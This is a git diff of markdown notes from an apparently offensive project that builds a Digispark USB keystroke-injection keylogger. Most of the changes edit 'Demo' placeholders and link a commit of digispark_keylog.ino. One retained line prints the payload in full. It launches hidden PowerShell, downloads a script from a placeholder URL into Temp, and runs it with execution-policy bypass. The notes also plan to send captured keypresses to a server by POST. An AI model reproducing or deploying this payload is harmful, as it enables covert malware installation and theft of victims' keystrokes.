@@ -349,8 +349,6 @@ exit(0);
 
 Confirmed and working like should.
 
-[Demo coming here]()
-
 **Profit!**
 
 **TODO:**
@@ -854,7 +852,7 @@ Finished:
 Working:   
 ![](notes_res/notes-%2012.png)
 
-[Demo]()
+*Demo coming later on.* 
 
 **Todo:**   
 *Sending the keypresses as POST requests to server?*
@@ -1092,4 +1090,7 @@ After this, i had to tinker the Digispark payload for Keylogger script, to run t
 DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'URL_TO_DOWNLOAD_THE_SCRIPT\', \\\"$env:Temp\\maltsu.ps1\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\maltsu.ps1\\\"\"");
 ```
 
-And update the file:
+And updated the file:   
+[digispark_keylog.ino](https://github.com/therealhalonen/PhishSticks/commit/3b344965f29c275a46f313c8dded384b7144c329)
+
+[Demo video]()
